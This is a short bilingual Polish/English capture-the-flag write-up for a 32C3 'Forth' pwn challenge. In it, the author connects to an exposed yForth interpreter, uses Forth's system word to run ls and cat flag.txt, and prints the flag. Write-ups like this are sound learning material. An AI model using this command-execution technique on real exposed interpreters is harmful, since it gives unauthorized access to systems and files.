##Forth (Pwn, 150p)

> Connect to 136.243.194.49:1024 and get a shell.

###PL
[ENG](#eng-version)

Łącząc się z podanym serwerem dostajemy taką odpowiedź:

> yForth? v0.2  Copyright (C) 2012  Luca Padovani

> This program comes with ABSOLUTELY NO WARRANTY.

> This is free software, and you are welcome to redistribute it under certain conditions; see LICENSE for details.


Forth pozwala nam na wykonanie systemowych komand za pomocą `s" komenda" system` (spacja przed komendą jest ważna)

Spróbujmy zatem wyświetlić zawartość aktualnego katalogu:

>s" ls" system

>flag.txt  README.gpl  run.sh  yforth

>ok

Zobaczmy co się znajduje w pliku flag.txt:

>s" cat flag.txt" system

>32C3_a8cfc6174adcb39b8d6dc361e888f17b

>ok

Zadanie gotowe!

###ENG

When connected to the server we get the following response: 

> yForth? v0.2  Copyright (C) 2012  Luca Padovani

> This program comes with ABSOLUTELY NO WARRANTY.

> This is free software, and you are welcome to redistribute it under certain conditions; see LICENSE for details.

Forth allows system calls by calling `s" command" system` (notice the space before command)

Let's view the insides of our current folder then:

>s" ls" system

>flag.txt  README.gpl  run.sh  yforth

>ok

How about reading the flag.txt file?

>s" cat flag.txt" system

>32C3_a8cfc6174adcb39b8d6dc361e888f17b

>ok

Challange complete!
